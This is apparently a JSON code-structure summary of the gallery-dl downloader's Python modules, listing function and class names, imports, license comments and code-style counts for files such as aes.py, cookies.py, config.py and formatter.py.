          "# config spec",
          "# url"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 32,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/__main__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os.path",
          "import gallery_dl"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2017-2023 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/actions.py",
        "docstrings": [],
        "function_defs": [
          "def parse_logging(actionspec):",
          "def parse_signals(actionspec):",
          "def __init__(self, logger, job):",
          "def log(self, level, msg, *args, **kwargs):",
          "def _level_to_int(level):",
          "def _chain_actions(actions):",
          "def _chain(args):",
          "def signals_handler(action, args={}):",
          "def handler(signal_num, frame):",
          "def action_print(opts):",
          "def _print(_):",
          "def action_status(opts):",
          "def _status(args):",
          "def action_level(opts):",
          "def _level(args):",
          "def action_exec(opts):",
          "def _exec(_):",
          "def action_wait(opts):",
          "def _wait(args):",
          "def _wait(args):",
          "def action_flag(opts):",
          "def _flag(args):",
          "def action_raise(opts):",
          "def _raise(args):",
          "def _raise(args):",
          "def action_abort(opts):",
          "def action_terminate(opts):",
          "def action_restart(opts):",
          "def action_exit(opts):",
          "def _exit(args):"
        ],
        "class_defs": [
          "class LoggerAdapter():"
        ],
        "imports": [
          "import time",
          "import logging",
          "import operator",
          "import functools",
          "from . import util, exception",
          "import signal",
          "import builtins"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2023-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# --------------------------------------------------------------------"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/aes.py",
        "docstrings": [],
        "function_defs": [
          "def aes_cbc_decrypt_bytes(data, key, iv):\n\"\"\"Decrypt bytes with AES-CBC using pycryptodome\"\"\"\nreturn Cryptodome_AES.new(\nkey, Cryptodome_AES.MODE_CBC, iv).decrypt(data)\n\ndef aes_gcm_decrypt_and_verify_bytes(data, key, tag, nonce):\n\"\"\"Decrypt bytes with AES-GCM using pycryptodome\"\"\"",
          "def aes_gcm_decrypt_and_verify_bytes(data, key, tag, nonce):\n\"\"\"Decrypt bytes with AES-GCM using pycryptodome\"\"\"\nreturn Cryptodome_AES.new(\nkey, Cryptodome_AES.MODE_GCM, nonce).decrypt_and_verify(data, tag)\nelse:\ndef aes_cbc_decrypt_bytes(data, key, iv):\n\"\"\"Decrypt bytes with AES-CBC using native implementation\"\"\"",
          "def aes_cbc_decrypt_bytes(data, key, iv):\n\"\"\"Decrypt bytes with AES-CBC using native implementation\"\"\"\nreturn intlist_to_bytes(aes_cbc_decrypt(\nbytes_to_intlist(data),\nbytes_to_intlist(key),\nbytes_to_intlist(iv),\n))\n\ndef aes_gcm_decrypt_and_verify_bytes(data, key, tag, nonce):\n\"\"\"Decrypt bytes with AES-GCM using native implementation\"\"\"",
          "def aes_gcm_decrypt_and_verify_bytes(data, key, tag, nonce):\n\"\"\"Decrypt bytes with AES-GCM using native implementation\"\"\"\nreturn intlist_to_bytes(aes_gcm_decrypt_and_verify(\nbytes_to_intlist(data),\nbytes_to_intlist(key),\nbytes_to_intlist(tag),\nbytes_to_intlist(nonce),\n))\n\n",
          "def intlist_to_bytes(xs):",
          "def unpad_pkcs7(data):",
          "def aes_ecb_encrypt(data, key, iv=None):\n\"\"\"\nEncrypt with aes in ECB mode\n\n@param {int[]} data        cleartext\n@param {int[]} key         16/24/32-Byte cipher key\n@param {int[]} iv          Unused for this mode\n@returns {int[]}           encrypted data\n\"\"\"",
          "def aes_ecb_decrypt(data, key, iv=None):\n\"\"\"\nDecrypt with aes in ECB mode\n\n@param {int[]} data        cleartext\n@param {int[]} key         16/24/32-Byte cipher key\n@param {int[]} iv          Unused for this mode\n@returns {int[]}           decrypted data\n\"\"\"",
          "def aes_ctr_decrypt(data, key, iv):\n\"\"\"\nDecrypt with aes in counter mode\n\n@param {int[]} data        cipher\n@param {int[]} key         16/24/32-Byte cipher key\n@param {int[]} iv          16-Byte initialization vector\n@returns {int[]}           decrypted data\n\"\"\"",
          "def aes_ctr_encrypt(data, key, iv):\n\"\"\"\nEncrypt with aes in counter mode\n\n@param {int[]} data        cleartext\n@param {int[]} key         16/24/32-Byte cipher key\n@param {int[]} iv          16-Byte initialization vector\n@returns {int[]}           encrypted data\n\"\"\"",
          "def aes_cbc_decrypt(data, key, iv):\n\"\"\"\nDecrypt with aes in CBC mode\n\n@param {int[]} data        cipher\n@param {int[]} key         16/24/32-Byte cipher key\n@param {int[]} iv          16-Byte IV\n@returns {int[]}           decrypted data\n\"\"\"",
          "def aes_cbc_encrypt(data, key, iv):\n\"\"\"\nEncrypt with aes in CBC mode. Using PKCS#7 padding\n\n@param {int[]} data        cleartext\n@param {int[]} key         16/24/32-Byte cipher key\n@param {int[]} iv          16-Byte IV\n@returns {int[]}           encrypted data\n\"\"\"",
          "def aes_gcm_decrypt_and_verify(data, key, tag, nonce):\n\"\"\"\nDecrypt with aes in GBM mode and checks authenticity using tag\n\n@param {int[]} data        cipher\n@param {int[]} key         16-Byte cipher key\n@param {int[]} tag         authentication tag\n@param {int[]} nonce       IV (recommended 12-Byte)\n@returns {int[]}           decrypted data\n\"\"\"",
          "def aes_encrypt(data, expanded_key):\n\"\"\"\nEncrypt one block with aes\n\n@param {int[]} data          16-Byte state\n@param {int[]} expanded_key  176/208/240-Byte expanded key\n@returns {int[]}             16-Byte cipher\n\"\"\"",
          "def aes_decrypt(data, expanded_key):\n\"\"\"\nDecrypt one block with aes\n\n@param {int[]} data          16-Byte cipher\n@param {int[]} expanded_key  176/208/240-Byte expanded key\n@returns {int[]}             16-Byte state\n\"\"\"",
          "def aes_decrypt_text(data, password, key_size_bytes):\n\"\"\"\nDecrypt text\n- The first 8 Bytes of decoded 'data' are the 8 high Bytes of the counter\n- The cipher key is retrieved by encrypting the first 16 Byte of 'password'\nwith the first 'key_size_bytes' Bytes from 'password'\n(if necessary filled with 0's)\n- Mode of operation is 'counter'\n\n@param {str} data                    Base64 encoded string",
          "def key_expansion(data):\n\"\"\"\nGenerate key schedule\n\n@param {int[]} data  16/24/32-Byte cipher key\n@returns {int[]}     176/208/240-Byte expanded key\n\"\"\"",
          "def iter_vector(iv):",
          "def sub_bytes(data):",
          "def sub_bytes_inv(data):",
          "def rotate(data):",
          "def key_schedule_core(data, rcon_iteration):",
          "def xor(data1, data2):",
          "def iter_mix_columns(data, matrix):",
          "def shift_rows(data):",
          "def shift_rows_inv(data):",
          "def shift_block(data):",
          "def inc(data):",
          "def block_product(block_x, block_y):",
          "def ghash(subkey, data):"
        ],
        "class_defs": [],
        "imports": [
          "import struct",
          "import binascii",
          "from math import ceil",
          "from Cryptodome.Cipher import AES as Cryptodome_AES",
          "from Crypto.Cipher import AES as Cryptodome_AES",
          "import logging"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# This is a slightly modified version of yt-dlp's aes module.",
          "# https://github.com/yt-dlp/yt-dlp/blob/master/yt_dlp/aes.py",
          "# XXX: check aes, gcm param",
          "# TODO: add nonce support to aes_ctr_decrypt",
          "# nonce_ctr = j0[:12]",
          "# NIST SP 800-38D, Algorithm 1",
          "# NIST SP 800-38D, Algorithm 2"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 8,
        "decorators": [
          "@param {int[]} data        cleartext",
          "@param {int[]} key         16/24/32-Byte cipher key",
          "@param {int[]} iv          Unused for this mode",
          "@returns {int[]}           encrypted data",
          "@param {int[]} data        cleartext",
          "@param {int[]} key         16/24/32-Byte cipher key",
          "@param {int[]} iv          Unused for this mode",
          "@returns {int[]}           decrypted data",
          "@param {int[]} data        cipher",
          "@param {int[]} key         16/24/32-Byte cipher key",
          "@param {int[]} iv          16-Byte initialization vector",
          "@returns {int[]}           decrypted data",
          "@param {int[]} data        cleartext",
          "@param {int[]} key         16/24/32-Byte cipher key",
          "@param {int[]} iv          16-Byte initialization vector",
          "@returns {int[]}           encrypted data",
          "@param {int[]} data        cipher",
          "@param {int[]} key         16/24/32-Byte cipher key",
          "@param {int[]} iv          16-Byte IV",
          "@returns {int[]}           decrypted data",
          "@param {int[]} data        cleartext",
          "@param {int[]} key         16/24/32-Byte cipher key",
          "@param {int[]} iv          16-Byte IV",
          "@returns {int[]}           encrypted data",
          "@param {int[]} data        cipher",
          "@param {int[]} key         16-Byte cipher key",
          "@param {int[]} tag         authentication tag",
          "@param {int[]} nonce       IV (recommended 12-Byte)",
          "@returns {int[]}           decrypted data",
          "@param {int[]} data          16-Byte state",
          "@param {int[]} expanded_key  176/208/240-Byte expanded key",
          "@returns {int[]}             16-Byte cipher",
          "@param {int[]} data          16-Byte cipher",
          "@param {int[]} expanded_key  176/208/240-Byte expanded key",
          "@returns {int[]}             16-Byte state",
          "@param {str} data                    Base64 encoded string",
          "@param {str,unicode} password        Password (will be encoded with utf-8)",
          "@param {int} key_size_bytes          Possible values: 16 for 128-Bit,",
          "@returns {str}                       Decrypted data",
          "@param {int[]} data  16/24/32-Byte cipher key",
          "@returns {int[]}     176/208/240-Byte expanded key"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/archive.py",
        "docstrings": [],
        "function_defs": [
          "def connect(path, prefix, format,",
          "def sanitize(name):",
          "def __init__(self, path, keygen, table=None, pragma=None, cache_key=None):",
          "def add(self, kwdict):\n\"\"\"Add item described by 'kwdict' to archive\"\"\"\nkey = kwdict.get(self._cache_key) or self.keygen(kwdict)\nself.cursor.execute(self._stmt_insert, (key,))\n\ndef check(self, kwdict):\n\"\"\"Return True if the item described by 'kwdict' exists in archive\"\"\"",
          "def check(self, kwdict):\n\"\"\"Return True if the item described by 'kwdict' exists in archive\"\"\"\nkey = kwdict[self._cache_key] = self.keygen(kwdict)\nself.cursor.execute(self._stmt_select, (key,))\nreturn self.cursor.fetchone()\n\ndef finalize(self):\npass\n\n",
          "def finalize(self):",
          "def __init__(self, path, keygen, table=None, pragma=None, cache_key=None):",
          "def add(self, kwdict):",
          "def check(self, kwdict):",
          "def finalize(self):",
          "def __init__(self, uri, keygen, table=None, pragma=None, cache_key=None):",
          "def add(self, kwdict):",
          "def check(self, kwdict):",
          "def finalize(self):",
          "def __init__(self, path, keygen, table=None, pragma=None, cache_key=None):",
          "def add(self, kwdict):",
          "def check(self, kwdict):",
          "def finalize(self):"
        ],
        "class_defs": [
          "class DownloadArchive():",
          "class DownloadArchiveMemory(DownloadArchive):",
          "class DownloadArchivePostgresql():",
          "class DownloadArchivePostgresqlMemory(DownloadArchivePostgresql):"
        ],
        "imports": [
          "import os",
          "import logging",
          "from . import util, formatter"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2024-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# fallback for missing WITHOUT ROWID support (#553)"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 16,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/cache.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, func, keyarg):",
          "def __get__(self, instance, cls):",
          "def __call__(self, *args, **kwargs):",
          "def update(self, key, value):",
          "def invalidate(self, key=\"\"):",
          "def __init__(self, func, keyarg, maxage):",
          "def __call__(self, *args, **kwargs):",
          "def update(self, key, value):",
          "def __init__(self, func, keyarg, maxage):",
          "def __get__(self, obj, objtype):",
          "def __call__(self, *args, **kwargs):",
          "def update(self, key, value):",
          "def invalidate(self, key):",
          "def database(self):",
          "def memcache(maxage=None, keyarg=None):",
          "def wrap(func):",
          "def wrap(func):",
          "def cache(maxage=3600, keyarg=None):",
          "def wrap(func):",
          "def clear(module):\n\"\"\"Delete database entries for 'module'\"\"\"\ndb = DatabaseCacheDecorator.db\nif not db:\nreturn None\n\nrowcount = 0\ncursor = db.cursor()\n\ntry:",
          "def _path():",
          "def _init():"
        ],
        "class_defs": [
          "class CacheDecorator():",
          "class MemoryCacheDecorator(CacheDecorator):",
          "class DatabaseCacheDecorator():"
        ],
        "imports": [
          "import sqlite3",
          "import pickle",
          "import time",
          "import os",
          "import functools",
          "from . import config, util"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2016-2021 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# in-memory cache lookup",
          "# database lookup",
          "# restrict access permissions for new db files"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 16,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/config.py",
        "docstrings": [],
        "function_defs": [
          "def initialize():",
          "def open_extern():",
          "def status():",
          "def remap_categories():",
          "def load(files=None, strict=False, loads=util.json_loads, conf=_config):\n\"\"\"Load JSON configuration files\"\"\"\nfor pathfmt in files or _default_configs:\npath = util.expand_path(pathfmt)\ntry:\nwith open(path, encoding=\"utf-8\") as fp:\nconfig = loads(fp.read())\nexcept OSError as exc:\nif strict:\nlog.error(exc)",
          "def clear():\n\"\"\"Reset configuration to an empty state\"\"\"\n_config.clear()\n\n\ndef get(path, key, default=None, conf=_config):\n\"\"\"Get the value of property 'key' or a default value\"\"\"",
          "def get(path, key, default=None, conf=_config):\n\"\"\"Get the value of property 'key' or a default value\"\"\"\ntry:\nfor p in path:\nconf = conf[p]\nreturn conf[key]\nexcept Exception:\nreturn default\n\n",
          "def interpolate(path, key, default=None, conf=_config):\n\"\"\"Interpolate the value of 'key'\"\"\"\nif key in conf:\nreturn conf[key]\ntry:\nfor p in path:\nconf = conf[p]\nif key in conf:\ndefault = conf[key]\nexcept Exception:",
          "def interpolate_common(common, paths, key, default=None, conf=_config):\n\"\"\"Interpolate the value of 'key'\nusing multiple 'paths' along a 'common' ancestor\n\"\"\"",
          "def accumulate(path, key, conf=_config):\n\"\"\"Accumulate the values of 'key' along 'path'\"\"\"\nresult = []\ntry:\nif key in conf:\nif value := conf[key]:\nif isinstance(value, list):\nresult.extend(value)\nelse:\nresult.append(value)",
          "def set(path, key, value, conf=_config):\n\"\"\"Set the value of property 'key' for this session\"\"\"\nfor p in path:\ntry:\nconf = conf[p]\nexcept KeyError:\nconf[p] = conf = {}\nconf[key] = value\n\n",
          "def setdefault(path, key, value, conf=_config):\n\"\"\"Set the value of property 'key' if it doesn't exist\"\"\"\nfor p in path:\ntry:\nconf = conf[p]\nexcept KeyError:\nconf[p] = conf = {}\nreturn conf.setdefault(key, value)\n\n",
          "def unset(path, key, conf=_config):\n\"\"\"Unset the value of property 'key'\"\"\"\ntry:\nfor p in path:\nconf = conf[p]\ndel conf[key]\nexcept Exception:\npass\n\n",
          "def __init__(self, kvlist):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_value, traceback):"
        ],
        "class_defs": [
          "class apply():"
        ],
        "imports": [
          "import sys",
          "import os.path",
          "import logging",
          "from . import util",
          "import shutil",
          "from .output import stdout_write"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2015-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# --------------------------------------------------------------------",
          "# internals",
          "# look for config file in PyInstaller executable directory (#682)",
          "# --------------------------------------------------------------------",
          "# public interface",
          "# follow the common path",
          "# try all paths until a value is found"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 30,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/cookies.py",
        "docstrings": [],
        "function_defs": [
          "def load_cookies(browser_specification):",
          "def load_cookies_firefox(browser_name, profile=None,",
          "def load_cookies_webkit(browser_name, profile=None, domain=None):\n\"\"\"Ref.: https://github.com/libyal/dtformats/blob\n/main/documentation/Safari%20Cookies.asciidoc\n- This data appears to be out of date\nbut the important parts of the database structure is the same\n- There are a few bytes here and there\nwhich are skipped during parsing\n\"\"\"",
          "def load_cookies_chromium(browser_name, profile=None,",
          "def _firefox_cookies_database(browser_name, profile=None, container=None):",
          "def _firefox_browser_directory(browser_name):",
          "def _safari_cookies_database():",
          "def _orion_cookies_database():",
          "def _webkit_parse_cookies_header(data):",
          "def _webkit_parse_cookies_page(data, cookies, domain=None):",
          "def _webkit_parse_cookies_record(data, cookies, host=None):",
          "def _chromium_cookies_database(profile, config):",
          "def _chromium_browser_settings(browser_name):",
          "def _chromium_cookie_decryptor(",
          "def decrypt(self, encrypted_value):",
          "def cookie_counts(self):",
          "def __init__(self, browser_keyring_name, keyring=None, meta_version=0):",
          "def derive_key(self, password):",
          "def cookie_counts(self):",
          "def decrypt(self, encrypted_value):",
          "def __init__(self, browser_keyring_name, meta_version=0):",
          "def derive_key(self, password):",
          "def cookie_counts(self):",
          "def decrypt(self, encrypted_value):",
          "def __init__(self, browser_root, meta_version=0):",
          "def cookie_counts(self):",
          "def decrypt(self, encrypted_value):",
          "def _choose_linux_keyring():\n\"\"\"\nhttps://chromium.googlesource.com/chromium/src/+/refs/heads\n/main/components/os_crypt/key_storage_util_linux.cc\nSelectBackend\n\"\"\"",
          "def _get_kwallet_network_wallet():\n\"\"\" The name of the wallet used to store network passwords.\n\nhttps://chromium.googlesource.com/chromium/src/+/refs/heads\n/main/components/os_crypt/kwallet_dbus.cc\nKWalletDBus::NetworkWallet\nwhich does a dbus call to the following function:\nhttps://api.kde.org/frameworks/kwallet/html/classKWallet_1_1Wallet.html\nWallet::NetworkWallet\n\"\"\"",
          "def _get_kwallet_password(browser_keyring_name):",
          "def _get_gnome_keyring_password(browser_keyring_name):",
          "def _get_linux_keyring_password(browser_keyring_name, keyring):",
          "def _get_mac_keyring_password(browser_keyring_name):",
          "def _get_windows_v10_key(browser_root):",
          "def __init__(self, data):",
          "def read_bytes(self, num_bytes):",
          "def expect_bytes(self, expected_value, message):",
          "def read_uint(self, big_endian=False):",
          "def read_double(self, big_endian=False):",
          "def read_cstring(self):",
          "def skip(self, num_bytes, description=\"unknown\"):",
          "def skip_to(self, offset, description=\"unknown\"):",
          "def skip_to_end(self, description=\"unknown\"):",
          "def __init__(self, path):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_value, traceback):",
          "def Popen_communicate(*args):",
          "def _get_linux_desktop_environment(env):\n\"\"\"\nRef: https://chromium.googlesource.com/chromium/src/+/refs/heads\n/main/base/nix/xdg_util.cc - GetDesktopEnvironment\n\"\"\"",
          "def _mac_absolute_time_to_posix(timestamp):",
          "def pbkdf2_sha1(password, salt, iterations, key_length):",
          "def _decrypt_aes_cbc(ciphertext, key, offset=0,",
          "def _decrypt_aes_gcm(ciphertext, key, nonce, authentication_tag, offset=0):",
          "def _decrypt_windows_dpapi(ciphertext):\n\"\"\"\nReferences:\n- https://docs.microsoft.com/en-us/windows\n/win32/api/dpapi/nf-dpapi-cryptunprotectdata\n\"\"\"",
          "def _find_most_recently_used_file(root, filename):",
          "def _is_path(value):",
          "def _parse_browser_specification(",
          "def _log_warning(msg, *args):",
          "def _log_error(msg, *args):"
        ],
        "class_defs": [
          "class ChromiumCookieDecryptor:",
          "class LinuxChromiumCookieDecryptor(ChromiumCookieDecryptor):",
          "class MacChromiumCookieDecryptor(ChromiumCookieDecryptor):",
          "class WindowsChromiumCookieDecryptor(ChromiumCookieDecryptor):",
          "class ParserError(Exception):",
          "class DataParser:",
          "class DatabaseConnection():",
          "class DATA_BLOB(ctypes.Structure):"
        ],
        "imports": [
          "import binascii",
          "import ctypes",
          "import logging",
          "import os",
          "import shutil",
          "import sqlite3",
          "import struct",
          "import subprocess",
          "import sys",
          "import tempfile",
          "from hashlib import pbkdf2_hmac",
          "from http.cookiejar import Cookie",
          "from . import aes, text, util",
          "import secretstorage",
          "from ctypes.wintypes import DWORD"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2022-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# Adapted from yt-dlp's cookies module.",
          "# https://github.com/yt-dlp/yt-dlp/blob/master/yt_dlp/cookies.py",
          "# https://stackoverflow.com/a/43520042",
          "# --------------------------------------------------------------------",
          "# firefox",
          "# --------------------------------------------------------------------",
          "# safari/orion/webkit",
          "# --------------------------------------------------------------------",
          "# chromium",
          "# https://chromium.googlesource.com/chromium",
          "# /src/+/HEAD/docs/user_data_dir.md",
          "# Linux keyring names can be determined by snooping on dbus",
          "# while opening the browser in KDE:",
          "# dbus-monitor \"interface=\"org.kde.KWallet\"\" \"type=method_return\"",
          "# values from",
          "# https://chromium.googlesource.com/chromium/src/+/refs/heads",
          "# /main/components/os_crypt/os_crypt_linux.cc",
          "# values from",
          "# https://chromium.googlesource.com/chromium/src/+/refs/heads",
          "# /main/components/os_crypt/os_crypt_mac.mm",
          "# other prefixes are considered \"old data\",",
          "# which were stored as plaintext",
          "# https://chromium.googlesource.com/chromium/src/+/refs/heads",
          "# /main/components/os_crypt/os_crypt_mac.mm",
          "# https://chromium.googlesource.com/chromium/src/+/refs/heads",
          "# /main/components/os_crypt/os_crypt_win.cc",
          "#   kNonceLength",
          "# boringssl",
          "#   EVP_AEAD_AES_GCM_TAG_LEN",
          "# any other prefix means the data is DPAPI encrypted",
          "# https://chromium.googlesource.com/chromium/src/+/refs/heads",
          "# /main/components/os_crypt/os_crypt_win.cc",
          "# --------------------------------------------------------------------",
          "# keyring",
          "# This sometimes occurs in KDE because chrome does not check",
          "# hasEntry and instead just tries to read the value (which",
          "# kwallet returns \"\") whereas kwallet-query checks hasEntry.",
          "# To verify this:",
          "# dbus-monitor \"interface=\"org.kde.KWallet\"\" \"type=method_return\"",
          "# while starting chrome.",
          "# This may be a bug, as the intended behaviour is to generate a",
          "# random password and store it, but that doesn't matter here.",
          "# Gnome keyring does not seem to organise keys in the same way as KWallet,",
          "# using `dbus-monitor` during startup, it can be observed that chromium",
          "# lists all keys and presumably searches for its key in the list.",
          "# It appears that we must do the same.",
          "# https://github.com/jaraco/keyring/issues/556",
          "# Note: chrome/chromium can be run with the following flags",
          "# to determine which keyring backend it has chosen to use",
          "# - chromium --enable-logging=stderr --v=1 2>&1 | grep key_storage_",
          "#",
          "# Chromium supports --password-store=<basic|gnome|kwallet>",
          "# so the automatic detection will not be sufficient in all cases.",
          "# when basic text is chosen, all cookies are stored as v10",
          "# so no keyring password is required",
          "# --------------------------------------------------------------------",
          "# utility",
          "# https://www.sqlite.org/uri.html#the_uri_path",
          "# 978307200 is timestamp of 2001-01-01 00:00:00",
          "# if the provided root points to an exact profile path",
          "# check if it contains the wanted filename",
          "# if there are multiple browser profiles, take the most recently used one"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 46,
        "decorators": [
          "@property",
          "@property",
          "@property",
          "@property"
        ]
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/exception.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, message=None, fmt=True):",
          "def __init__(self, message=\"\", response=None):",
          "def __init__(self, challenge, response):",
          "def __init__(self, auth=None, resource=\"resource\", message=None):",
          "def __init__(self, target=None):"
        ],
        "class_defs": [
          "class GalleryDLException(Exception):",
          "class ExtractionError(GalleryDLException):",
          "class HttpError(ExtractionError):",
          "class ChallengeError(HttpError):",
          "class AuthenticationError(ExtractionError):",
          "class AuthorizationError(ExtractionError):",
          "class AuthRequired(AuthorizationError):",
          "class NotFoundError(ExtractionError):",
          "class InputError(GalleryDLException):",
          "class FormatError(InputError):",
          "class FilenameFormatError(FormatError):",
          "class DirectoryFormatError(FormatError):",
          "class FilterError(InputError):",
          "class InputFileError(InputError):",
          "class NoExtractorError(InputError):",
          "class ControlException(GalleryDLException):",
          "class StopExtraction(ControlException):",
          "class AbortExtraction(ExtractionError, ControlException):",
          "class TerminateExtraction(ControlException):",
          "class RestartExtraction(ControlException):"
        ],
        "imports": [],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2015-2023 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "###############################################################################",
          "# Extractor Errors ############################################################",
          "###############################################################################",
          "# User Input ##################################################################",
          "###############################################################################",
          "# Control Flow ################################################################"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/formatter.py",
        "docstrings": [],
        "function_defs": [
          "def parse(format_string, default=NONE, fmt=format):",
          "def __init__(self, format_string, default=NONE, fmt=format):",
          "def format_map(self, kwdict):\n\"\"\"Apply 'kwdict' to the initial format_string and return its result\"\"\"\nresult = self.result\nfor index, func in self.fields:\nresult[index] = func(kwdict)\nreturn \"\".join(result)\n\ndef _field_access(self, field_name, format_spec, conversion):\nfmt = self._parse_format_spec(format_spec, conversion)\n",
          "def _field_access(self, field_name, format_spec, conversion):",
          "def _apply(self, key, funcs, fmt):",
          "def wrap(kwdict):",
          "def _apply_globals(self, gobj, funcs, fmt):",
          "def wrap(_):",
          "def _apply_simple(self, key, fmt):",
          "def wrap(kwdict):",
          "def _apply_list(self, lst, fmt):",
          "def wrap(kwdict):",
          "def _parse_format_spec(self, format_spec, conversion):",
          "def __init__(self, expression, default=NONE, fmt=None):",
          "def __init__(self, fstring, default=NONE, fmt=None):\nself.format_map = util.compile_expression(f'f\"\"\"{fstring}\"\"\"')\n\n\ndef _init_jinja():\nimport jinja2\nfrom . import config\n\nif opts := config.get((), \"jinja\"):\nJinjaFormatter.env = env = jinja2.Environment(",
          "def _init_jinja():",
          "def __init__(self, source, default=NONE, fmt=None):",
          "def __init__(self, function_spec, default=NONE, fmt=None):",
          "def __init__(self, path, default=NONE, fmt=format):",
          "def __init__(self, path, default=NONE, fmt=None):",
          "def __init__(self, path, default=NONE, fmt=None):",
          "def parse_field_name(field_name):",
          "def _slice(indices):",
          "def _bytesgetter(slice, encoding=sys.getfilesystemencoding()):",
          "def apply_slice_bytes(obj):",
          "def _build_format_func(format_spec, default):",
          "def _parse_optional(format_spec, default):",
          "def optional(obj):",
          "def _parse_slice(format_spec, default):",
          "def apply_slice(obj):",
          "def apply_slice(obj):",
          "def _parse_arithmetic(format_spec, default):",
          "def _parse_conversion(format_spec, default):",
          "def convert_one(obj):",
          "def convert_many(obj):",
          "def _parse_maxlen(format_spec, default):",
          "def mlen(obj):",
          "def _parse_join(format_spec, default):",
          "def apply_join(obj):",
          "def _parse_map(format_spec, default):",
          "def map_(obj):",
          "def _parse_replace(format_spec, default):",
          "def replace(obj):",
          "def _parse_datetime(format_spec, default):",
          "def dt(obj):",
          "def _parse_offset(format_spec, default):",
          "def off(dt):",
          "def off(obj):",
          "def _parse_sort(format_spec, default):",
          "def sort_desc(obj):",
          "def sort_asc(obj):",
          "def _parse_limit(format_spec, default):",
          "def apply_limit(obj):",
          "def _default_format(format_spec, default):",
          "def wrap(obj):",
          "def __getitem__(self, key):"
        ],
        "class_defs": [
          "class StringFormatter():",
          "class ExpressionFormatter():",
          "class FStringFormatter():",
          "class JinjaFormatter():",
          "class ModuleFormatter():",
          "class TemplateFormatter(StringFormatter):",
          "class TemplateFStringFormatter(FStringFormatter):",
          "class TemplateJinjaFormatter(JinjaFormatter):",
          "class Literal():"
        ],
        "imports": [
          "import os",
          "import sys",
          "import time",
          "import string",
          "import _string",
          "import datetime",
          "import operator",
          "from . import text, util",
          "import logging",
          "import jinja2",
          "from . import config"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2021-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# Go to _CONVERSIONS and _SPECIFIERS below to se all of them, read:",
          "# https://github.com/mikf/gallery-dl/blob/master/docs/formatting.md",
          "# __getattr__, __getattribute__, and __class_getitem__",
          "# are all slower than regular __getitem__"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 12,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/job.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, extr, parent=None):",
          "def _build_config_path(self, parent):",
          "def run(self):\n\"\"\"Execute or run the job\"\"\"\nextractor = self.extractor\nlog = extractor.log\nmsg = None\n\nself._init()\n\n# sleep before extractor start\nsleep = util.build_duration_func(",
